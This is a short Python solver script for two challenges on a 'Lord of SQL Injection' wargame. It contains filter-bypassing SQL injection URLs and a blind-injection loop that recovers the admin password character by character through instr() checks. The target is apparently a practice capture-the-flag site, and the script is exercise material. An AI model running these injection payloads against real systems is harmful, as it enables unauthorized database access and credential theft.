#chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1234&no=1||!(id%0anot%0ain%0a("admin")||length(pw)not%0ain(8))

#chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1234%27%20||!(id%20not%20like%20%27admin%27||length(pw)not%20like%208)%23

import requests
from dotenv import load_dotenv
import os

load_dotenv()

candidate = ['0','1','2','3','4','5','6','7','8','9',
             'a','b','c','d','e','f',
             'g','h','i','j','k','l','m',
             'n','o','p','q','r','s','t',
             'u','v','w','x','y','z',
             'A','B','C','D','E','F',
             'G','H','I','J','K','L','M',
             'N','O','P','Q','R','S','T',
             'U','V','W','X','Y','Z',
             '!', '@', '#', '$', '%', '^', '&', '*']
# all ascii
# ascii = [chr(i) for i in range(32, 127)]
# candidate = ascii
pLength = 0

#instr의 중복문제를 생각해야함

answer = ''
for i in range(0,8):
    for j in candidate:
        #string to hex
        hex_j = '0x'+j.encode('utf-8').hex()
        url=os.environ.get('LOS_URL')+'chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1234&no=1||!(id%0anot%0ain%0a("admin")||instr(pw,"'+j+'")not%0ain('+str(i+1)+'))'
        #print(url)
        headers = {
            'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
        }
        res=requests.get(url, headers=headers)
        if 'Hello admin' in res.text[:200]:
            answer += j
            break
        else:
            print(j+' is not the answer')
    print(answer)

print(answer)

#52dc39" "1
